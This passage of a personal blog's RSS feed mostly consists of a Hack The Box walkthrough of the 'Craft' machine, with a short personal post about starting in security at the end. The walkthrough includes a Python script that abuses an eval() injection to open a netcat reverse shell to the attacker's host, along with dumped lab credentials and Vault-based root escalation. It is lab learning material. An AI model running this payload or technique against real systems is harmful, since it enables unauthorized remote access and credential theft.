<p>We got user shell, and after listing the files in it&rsquo;s home there is an interesting .exe called <code>RemoteConnection.exe</code>, from here it will be needed to download that RemoteConnection.exe and start getting the hands dirty with some debugger to start doing reversing and see what it&rsquo;s hiding, but as I said before this will be an update in the future once I know how to do it :P.</p>

<p>So far then we know this box has 2 ways to get root, I enjoyed quite a lot this box, and Im looking forward to do it again once I know some reversing.</p>

<p>Until nex write up!</p>
]]></content>
        </item>
        
        <item>
            <title>Hack The Box - Craft</title>
            <link>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</link>
            <pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate>
            
            <guid>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</guid>
            <description>Quick Summary So!! Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot @Fugl!</description>
            <content type="html"><![CDATA[


    <img src="/images/htb/craft/info-card.png"  class="center"  style="border-radius: 8px;"  />



<h2 id="quick-summary">Quick Summary</h2>

<p>So!!
Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot <a href="https://www.hackthebox.eu/profile/103596" target="_blank">@Fugl!</a>), root was easy by a little bit of enumeration and reading help command output.</p>

<p>I had so much fun with this box trying to break in before it was going to be retired, that challenge of doing it with a few hours of deadline felt so god!</p>

<p>Said that, let&rsquo;s start with the real write up!</p>

<h2 id="nmap">Nmap</h2>

<p>We start running nmap to scan for open ports and services:</p>

<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 17:21 EST
Nmap scan report for 10.10.10.110
Host is up (0.082s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/23%OT=22%CT=1%CU=35537%PV=Y%DS=2%DC=I%G=Y%TM=5E013E
OS:1F%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=8)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds
</code></pre>

<p>We got port port 22 (SSH) and 443 (HTTPS) are open.</p>

<h2 id="web-enumeration">Web enumeration</h2>

<p>The home page is kind-empty, but if we position the cursor on API and the Github logo, we see at the bottom that it will redirect to <code>https://api.craft.htb</code> and <code>https://gogs.craft.htb</code>, we will add them to <code>/etc/hosts</code> pointing to the IP of craft <code>10.10.10.110</code>.</p>

<p>
    <img src="/images/htb/craft/1-web-enum.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/craft/2-web-enum.png"  class="center"  style="border-radius: 8px;"  />

</p>

<p>Afterwards, we jump into <code>https://api.craft.htb</code> and we can see the endpoints and how to interact with them.</p>


    <img src="/images/htb/craft/1-api.png"  class="center"  style="border-radius: 8px;"  />




    <img src="/images/htb/craft/2-api.png"  class="center"  style="border-radius: 8px;"  />




    <img src="/images/htb/craft/3-api.png"  class="center"  style="border-radius: 8px;"  />



<p>We don&rsquo;t have at the moment any credentials to identify, so we go to <code>https://gogs.craft.htb</code> in order to see if we can find something.</p>


    <img src="/images/htb/craft/1-gogs.png"  class="center"  style="border-radius: 8px;"  />




    <img src="/images/htb/craft/2-gogs.png"  class="center"  style="border-radius: 8px;"  />




    <img src="/images/htb/craft/3-gogs.png"  class="center"  style="border-radius: 8px;"  />



<p>We see in explore there is a repository named <code>craft-api</code> and that the users is our gang from Silicon Valley.</p>

<p>We jump into the repository, and start looking if we can find something.</p>


    <img src="/images/htb/craft/4-gogs.png"  class="center"  style="border-radius: 8px;"  />



<p>There is an issue open, so we go inside it, and there is a &ldquo;fix&rdquo;, one that Gilfoyle is not happy about it.</p>


    <img src="/images/htb/craft/5-gogs.png"  class="center"  style="border-radius: 8px;"  />



<p>So, there is the use of an <code>eval()</code>, that&rsquo;s something we could use to inject a command.</p>


    <img src="/images/htb/craft/6-gogs.png"  class="center"  style="border-radius: 8px;"  />



<p>Taking a look into the commits made by Denish, we found in the commit <code>a2d28ed155</code> that he removed hardcoded credentials, exactly the kind of things we needed:</p>


    <img src="/images/htb/craft/7-gogs.png"  class="center"  style="border-radius: 8px;"  />



<h2 id="rce">RCE</h2>

<p>Now with credentials, knowing we could take advantage of the <code>eval()</code> and remembering the curl Denish was using in his issue + the API, we can make an injection via a POST to <code>/api/brew/</code>.
I wrote a small script to authenticate and post that does the injection (tbh, I missed I could just use <code>test.py</code> realized about it late). grabbing the token and using it to authenticate.</p>

<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests
import re
import json

url = &quot;https://api.craft.htb/api/auth/login&quot;
login=('dinesh', '4aUh0A8PbVJxgd')
r = requests.get(url, auth=login, allow_redirects=False, verify=False)
token = json.loads(r.text)['token']
print(token)
url = &quot;https://api.craft.htb/api/brew/&quot;
headers = {'X-Craft-API-Token':token, 'Content-Type': 'application/json'}
inject = &quot;&quot;&quot;__import__(&quot;os&quot;).system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f&quot;)&quot;&quot;&quot;
payload = {&quot;name&quot;:&quot;foo&quot;,&quot;brewer&quot;:&quot;foo&quot;, &quot;style&quot;:&quot;foo&quot;, &quot;abv&quot;:inject}
payload = json.dumps(payload)
attack = requests.post(url, verify=False, headers=headers, allow_redirects=False, data=payload)
</code></pre>

<p>In one tab run nc listening on port 4444 with <code>nc -lvp 4444</code>, and run in other tab we run the script to get the reverse:</p>

<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py 
</code></pre>

<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.16] from api.craft.htb [10.10.10.110] 41887
/bin/sh: can't access tty; job control turned off
/opt/app # whoami
root
/opt/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
</code></pre>

<p>There is something weird, we are already root? we check if there is the <code>root.txt</code> in it&rsquo;s home and not, is not:</p>

<pre><code class="language-console">/opt/app # cd /root
/root # ls -la
total 12
drwx------    1 root     root          4096 Feb  9  2019 .
drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
drwx------    1 root     root          4096 Feb  9  2019 .cache
/root # 
</code></pre>

<p>So we start enumerating and realize we are inside a jail (specifically a docker container, busybox):</p>

<pre><code class="language-console">/opt/app # ls -la /
total 64
drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv
drwxr-xr-x    1 root     root          4096 Feb  6  2019 bin
drwxr-xr-x    5 root     root           340 Jan  4 20:47 dev
drwxr-xr-x    1 root     root          4096 Feb 10  2019 etc
drwxr-xr-x    2 root     root          4096 Jan 30  2019 home
drwxr-xr-x    1 root     root          4096 Feb  6  2019 lib
drwxr-xr-x    5 root     root          4096 Jan 30  2019 media
drwxr-xr-x    2 root     root          4096 Jan 30  2019 mnt
drwxr-xr-x    1 root     root          4096 Feb  9  2019 opt
dr-xr-xr-x  208 root     root             0 Jan  4 20:47 proc
drwx------    1 root     root          4096 Feb  9  2019 root
drwxr-xr-x    2 root     root          4096 Jan 30  2019 run
drwxr-xr-x    2 root     root          4096 Jan 30  2019 sbin
drwxr-xr-x    2 root     root          4096 Jan 30  2019 srv
dr-xr-xr-x   13 root     root             0 Jan  4 20:47 sys
drwxrwxrwt    1 root     root          4096 Jan  4 20:48 tmp
drwxr-xr-x    1 root     root          4096 Feb  9  2019 usr
drwxr-xr-x    1 root     root          4096 Jan 30  2019 var
/opt/app # ls -la /usr/bin
total 13236
drwxr-xr-x    1 root     root          4096 Feb  9  2019 .
drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
lrwxrwxrwx    1 root     root             8 Feb  9  2019 2to3 -&gt; 2to3-3.6
-rwxr-xr-x    1 root     root            95 Jan 24  2019 2to3-3.6
lrwxrwxrwx    1 root     root            12 Feb  6  2019 [ -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 [[ -&gt; /bin/busybox
-rwxr-xr-x    1 root     root         34944 Jan  2  2019 addr2line
-rwxr-xr-x    2 root     root         55240 Jan  2  2019 ar
-rwxr-xr-x    2 root     root        814672 Jan  2  2019 as
lrwxrwxrwx    1 root     root            12 Jan 30  2019 awk -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Feb  6  2019 basename -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 beep -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 blkdiscard -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 bunzip2 -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 bzcat -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 bzip2 -&gt; /bin/busybox
-rwxr-xr-x    1 root     root         30440 Jan  2  2019 c++filt
-rwxr-xr-x    1 root     root           214 Jan  3  2019 c89
-rwxr-xr-x    1 root     root           205 Jan  3  2019 c99
-rwxr-xr-x    1 root     root         14208 Jan 29  2019 c_rehash
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cal -&gt; /bin/busybox
lrwxrwxrwx    1 root     root             3 Feb  9  2019 cc -&gt; gcc
lrwxrwxrwx    1 root     root            12 Jan 30  2019 chvt -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Feb  6  2019 cksum -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 clear -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cmp -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Feb  6  2019 comm -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cpio -&gt; /bin/busybox
-rwxr-xr-x    1 root     root        898192 Jan  3  2019 cpp
lrwxrwxrwx    1 root     root            12 Jan 30  2019 crontab -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cryptpw -&gt; /bin/busybox
</code></pre>

<p>Inside the directory were we started <code>/opt/app</code> we see if there is something interesting:</p>

<pre><code class="language-console">/opt/app # ls -la
total 32
drwxr-xr-x    5 root     root          4096 Feb 10  2019 .
drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
drwxr-xr-x    8 root     root          4096 Feb  8  2019 .git
-rw-r--r--    1 root     root            18 Feb  7  2019 .gitignore
-rw-r--r--    1 root     root          1585 Feb  7  2019 app.py
drwxr-xr-x    5 root     root          4096 Feb  7  2019 craft_api
-rwxr-xr-x    1 root     root           673 Feb  8  2019 dbtest.py
drwxr-xr-x    2 root     root          4096 Feb  7  2019 tests
/opt/app # grep -ir '\(pass\|password\|passwd\)' *       
app.py:    flask_app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://%s:%s@%s/%s' % ( settings.MYSQL_DATABASE_USER, settings.MYSQL_DATABASE_PASSWORD, settings.MYSQL_DATABASE_HOST, settings.MYSQL_DATABASE_DB)
craft_api/api/auth/endpoints/__pycache__/auth.cpython-36.pyc:        Create an authentication token provided valid username and password.
craft_api/api/auth/endpoints/auth.py:        auth_results = User.query.filter(User.username == auth.username, User.password == auth.password).one()
craft_api/api/auth/endpoints/auth.py:        Create an authentication token provided valid username and password.
craft_api/database/models.py:    password = db.Column(db.String(80))
craft_api/database/models.py:    def __init__(self, username, password):
craft_api/database/models.py:        self.password = password
craft_api/settings.py:MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
dbtest.py:                             password=settings.MYSQL_DATABASE_PASSWORD,
/opt/app # 
</code></pre>

<p>There we see we have credentials for the database, we took a deep look into <code>craft_api/settings.py</code> to see which one is the user, and it&rsquo;s <code>craft</code>, we take a look into the <code>dbtest.py</code> we found early under <code>/opt/app</code>:</p>

<pre><code class="language-console">/opt/app # cat dbtest.py
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = &quot;SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1&quot;
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()
/opt/app #
</code></pre>

<p>It&rsquo;s using pymsql to interact with the database, going to the documentation of it, we see that what we need is to use the <code>method fetchall()</code>

    <img src="/images/htb/craft/1-rce.png"  class="center"  style="border-radius: 8px;"  />


So, I change the script to do a <code>show tables</code> using <code>fetchall()</code> instead of <code>fetchone()</code>:</p>

<pre><code class="language-console">/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \&quot;show tables\&quot;/' dbtest.py
/opt/app # sed -i 's/result \= cursor.fetchone()/result \= cursor.fetchall()/' dbtest.py
</code></pre>

<p>And post that, we ran the script, and we get 2 tables one that looks interesting named <code>user</code>, we modify again the sql query but to select all the records from that table:</p>

<pre><code class="language-console">/opt/app # python dbtest.py
[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
/opt/app # sed -i 's/sql \= \&quot;show tables\&quot;/sql \= \&quot;SELECT * FROM user\&quot;/' dbtest.py
/opt/app # python dbtest.py
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
/opt/app # 
</code></pre>

<p>So, we got the users <code>dinesh, ebachman and gilfoyle</code> and it&rsquo;s respective passwords, with that we go to <code>https://gogs.craft.htb</code> again and login as <code>gilfoyle</code> and we found that he has a private repo to deploy the infra called <code>craft-infra</code></p>


    <img src="/images/htb/craft/1-gil.png"  class="center"  style="border-radius: 8px;"  />




    <img src="/images/htb/craft/2-gil.png"  class="center"  style="border-radius: 8px;"  />



<p>We notice there exists a <code>.ssh</code> folder, we look into it and we get a pair of public/private ssh keys:</p>


    <img src="/images/htb/craft/3-gil.png"  class="center"  style="border-radius: 8px;"  />



<p>We try to login via ssh as <code>gilfoyle</code> re-using the password we got earlier and we found a success (actually the first tries it failed for me, and spent some hours trying to break the id_rsa with john without success, so give a new try with trying the founded passwords):</p>

<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Enter passphrase for key 'id_rsa': 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jan  3 23:45:10 2020 from 10.10.14.16
gilfoyle@craft:~$ id
uid=1001(gilfoyle) gid=1001(gilfoyle) groups=1001(gilfoyle)
gilfoyle@craft:~$ wc -c user.txt 
33 user.txt
</code></pre>

<h2 id="root">root</h2>

<p>We start enumerating to see if we can find anything interesting in the home of gilfoyle, and we found a <code>.vault-token</code> file (vault is a tool for securely access/store secrets as tokens, passowrds, certificates, etc, to learn more about it go to <a href="https://www.vaultproject.io/" target="_blank">Vault project page</a>), and try to login to vault with it which goes well.</p>

<pre><code class="language-console">gilfoyle@craft:~$ cat .vault-token 
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$ vault login
Token (will be hidden): 
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run &quot;vault login&quot;
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
token_duration       ∞
token_renewable      false
token_policies       [&quot;root&quot;]
identity_policies    []
policies             [&quot;root&quot;]
gilfoyle@craft:~$ 
</code></pre>

<p>We go back to the repo of <code>craft-infra</code> inside the <code>vault</code> folder to see if we can find the secret stored, in it is a small script <code>secrets.sh</code> which has exactly what we need:

    <img src="/images/htb/craft/4-gil.png"  class="center"  style="border-radius: 8px;"  />


with this information we run vault to get the kv if the secret is indeed there:</p>

<pre><code class="language-console">gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
========== Data ==========
Key                  Value
---                  -----
allowed_users        n/a
cidr_list            0.0.0.0/0
default_user         root
exclude_cidr_list    n/a
key_type             otp
port                 22
</code></pre>

<p>We know it is a ssh secret for root (that means, we can use it to establish a connection against root over ssh) with an otp key (<a href="https://en.wikipedia.org/wiki/One-time_password" target="_blank">One-Time Password</a>)
We check what options vault provides to use it:</p>

<pre><code class="language-console">gilfoyle@craft:~$ vault
Usage: vault &lt;command&gt; [args]

Common commands:
    read        Read data and retrieves secrets
    write       Write data, configuration, and secrets
    delete      Delete secrets and configuration
    list        List data or secrets
    login       Authenticate locally
    agent       Start a Vault agent
    server      Start a Vault server
    status      Print seal and HA status
    unwrap      Unwrap a wrapped secret

Other commands:
    audit          Interact with audit devices
    auth           Interact with auth methods
    kv             Interact with Vault's Key-Value storage
    lease          Interact with leases
    namespace      Interact with namespaces
    operator       Perform operator-specific tasks
    path-help      Retrieve API help for paths
    plugin         Interact with Vault plugins and catalog
    policy         Interact with policies
    secrets        Interact with secrets engines
    ssh            Initiate an SSH session
    token          Interact with tokens
gilfoyle@craft:~$ vault ssh -h
Usage: vault ssh [options] username@ip [ssh options]

  Establishes an SSH connection with the target machine.

  This command uses one of the SSH secrets engines to authenticate and
  automatically establish an SSH connection to a host. This operation requires
  that the SSH secrets engine is mounted and configured.

  SSH using the OTP mode (requires sshpass for full automation):

      $ vault ssh -mode=otp -role=my-role user@1.2.3.4

  SSH using the CA mode:

      $ vault ssh -mode=ca -role=my-role user@1.2.3.4

  SSH using CA mode with host key verification:

      $ vault ssh \
          -mode=ca \
          -role=my-role \
          -host-key-mount-point=host-signer \
          -host-key-hostnames=example.com \
          user@example.com

  For the full list of options and arguments, please see the documentation.
</code></pre>

<p>Is clear is needed to execute something like <code>vault ssh -mode=otp -role=my-role user@1.2.3.4</code>, so we do it:</p>

<pre><code class="language-console">gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 6290d45c-541f-fb96-32c7-3e5a8aa4a256


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Password: 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan  4 00:46:56 2020 from 127.0.0.1
root@craft:~# wc -c root.txt
33 root.txt
root@craft:~# 
</code></pre>

<p>And we own root!!
Again I enjoyed quite a lot doing this box a few hours it was going to be retired, and again thanks @Frundrod and <a href="https://www.hackthebox.eu/profile/103596" target="_blank">@Fugl</a> for pointing me in the right direction.</p>

<p>Thanks a lot for reading, and until the next write-up.</p>
]]></content>
        </item>
        
        <item>
            <title>shutdown -r now</title>
            <link>https://ceso.github.io/posts/2019/12/shutdown-r-now/</link>
            <pubDate>Sun, 22 Dec 2019 00:00:00 +0000</pubDate>
            
            <guid>https://ceso.github.io/posts/2019/12/shutdown-r-now/</guid>
            <description>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.
I have always been thinking about writing a blog, but my mindset has always been the same &amp;ldquo;me? a blog? what am I supposed to post! I can&amp;rsquo;t even think anything I could share with people, I don&amp;rsquo;t know nothing compared to the people who blogs!&amp;ldquo;, currently that mindset has been changing.</description>
            <content type="html"><![CDATA[<p>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.</p>

<p>I have always been thinking about writing a blog, but my mindset has always been the same &ldquo;me? a blog? what am I supposed to post! I can&rsquo;t even think anything I could share with people, I don&rsquo;t know nothing compared to the people
who blogs!&ldquo;, currently that mindset has been changing. In the same way, maybe I read a really entry-level article and at some moment and it was (or is) helpful for me, it also could be helpful for another person as well things faced, the issues I ran into, etc&hellip;, and being some sort of way of escape for me itself, I think this change of mindset is the result of my last 9 months living abroad.</p>

<p>I consider I started into IT being really old; with 18 I got my first Linux Sysadmin Job while with 9-12 years some children were playing with code, trying to break stuff, etc.
So far in this aprox. 5 years, I meet really nice people (as also not), and make really really nice friends, and of course been learning quite a lot of stuff, but&hellip;there is something that since I started I been avoiding (Programming), and something I&rsquo;ve been looking forward to learning it but thinking I can&rsquo;t do it (Security), these two things have been chasing me for a longg longg time (at the point of making me feel a bit depressed).</p>

<p>As I mentioned above, it&rsquo;s been around 9 months since I moved abroad (arrived in the Netherlands at ends of Apr. 2019), of this 9 months I spend 6 months in bench, without a project to work it (yes, getting my salary, but being anxious as I&rsquo;m, makes you to feel some panic when you get a paid for not doing nothing, even if you are studying), in this months I had a lot of time to think about myself, my career, what I wanted to do in the future, do I like to be a DevOps &ldquo;for all my life&rdquo; (today is devops, tomorrow who knows being as how IT works, so is just for saying it in a way), so&hellip;I started to study/practice with the book &lsquo;How to Design Programs&rsquo; (HtDP), even feeling I&rsquo;m going slow looking backwards and comparing to now, I think even if I still haven&rsquo;t finished, it indeed has been allowing me to grow.
Now&hellip;great, but, what about security? Is still there, and I really would like to start doing stuff NOW (I&rsquo;m more a learn-by-doing person), and not wait until get all my way through a designing programs book, combined with my thoughts of &ldquo;I can&rsquo;t do Sec. without coding/I can&rsquo;t even imagine being breaking stuff without deep understanding of data-types, algorithms&rdquo;, I was getting nowhere, so I decided to try to re-program that mindset of mine, that results in me exchanging words with friends about it, talking with people who are currently into sec, and so far was an excellent idea&hellip;thanks to that now I know coding is not needed (as in mandatory) but it helps a lot to at least being able to write scripts, understand the workflow of exploits and modify them, like other things, and&hellip;that&rsquo;s something I CAN DO (and have to experience in it).</p>

<p>Said that now my goal is to jump into the Sec. field, I started to play with boxes in HTB and reading some books, this has allowed me to set my first checkpoint: getting the OSCP cert, not for the cert itself, but more for the challenge and some compensation-ish for not having experience into sec.
Once getting the OSCP, I will come back to the HtDP to polish my programming skills (or why not, also try to keep it in parallel?), and keep climbing (I love rock climbing/bouldering, so I could use a lot of metaphors from it!) my way up to the tops, trying to not compare me with other people, enjoying the route, and learning from all my falls; a fight between me and me.</p>

<p>I will use this space to post walk-throughs in some HTB boxes, blog some thoughts once in a while (like this post itself), stuff in my path of also learning Dutch, etc.</p>

<p>So far so good, keep learning and never stop doing it.</p>
]]></content>
        </item>
        
    </channel>
</rss>
